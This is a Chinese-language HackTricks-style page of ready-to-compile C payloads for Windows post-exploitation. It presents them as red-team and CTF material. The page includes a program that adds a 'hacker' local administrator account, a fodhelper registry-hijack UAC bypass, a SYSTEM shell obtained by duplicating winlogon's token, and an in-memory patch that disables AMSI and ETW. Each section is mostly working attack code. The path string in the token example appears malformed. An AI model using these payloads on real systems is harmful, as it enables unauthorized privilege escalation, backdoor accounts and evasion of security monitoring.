# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

此页面收集了**小型、自包含的 C 代码片段**，在 Windows 本地权限提升或后期利用中非常方便。每个有效载荷都设计为**易于复制粘贴**，仅需 Windows API / C 运行时，并且可以使用 `i686-w64-mingw32-gcc` (x86) 或 `x86_64-w64-mingw32-gcc` (x64) 编译。

> ⚠️  这些有效载荷假设进程已经具有执行该操作所需的最低权限（例如 `SeDebugPrivilege`、`SeImpersonatePrivilege` 或用于 UAC 绕过的中等完整性上下文）。它们旨在用于**红队或 CTF 环境**，在这些环境中，利用漏洞已实现任意本地代码执行。

---

## 添加本地管理员用户
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC 绕过 – `fodhelper.exe` 注册表劫持 (中 → 高完整性)
当受信任的二进制文件 **`fodhelper.exe`** 被执行时，它会查询以下注册表路径 **而不过滤 `DelegateExecute` 动词**。通过在该键下植入我们的命令，攻击者可以绕过 UAC *而不* 将文件写入磁盘。

*`fodhelper.exe` 查询的注册表路径*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
一个最小的 PoC，可以弹出一个提升权限的 `cmd.exe`：
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*在 Windows 10 22H2 和 Windows 11 23H2（2025 年 7 月补丁）上进行了测试。绕过仍然有效，因为 Microsoft 尚未修复 `DelegateExecute` 路径中缺失的完整性检查。*

---

## 通过令牌复制生成 SYSTEM shell (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
如果当前进程同时拥有 **SeDebug** 和 **SeImpersonate** 权限（许多服务帐户的典型情况），您可以从 `winlogon.exe` 中窃取令牌，复制它，并启动一个提升的进程：
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\Windows\\\System32\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
对于其工作原理的更深入解释，请参见：

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## 内存中的 AMSI 和 ETW 补丁（防御规避）
大多数现代 AV/EDR 引擎依赖于 **AMSI** 和 **ETW** 来检查恶意行为。在当前进程中早期修补这两个接口可以防止基于脚本的有效载荷（例如 PowerShell、JScript）被扫描。
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*上述补丁是进程本地的；在运行后生成一个新的 PowerShell 将在没有 AMSI/ETW 检查的情况下执行。*

---

## 参考文献
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)

{{#include ../../banners/hacktricks-training.md}}
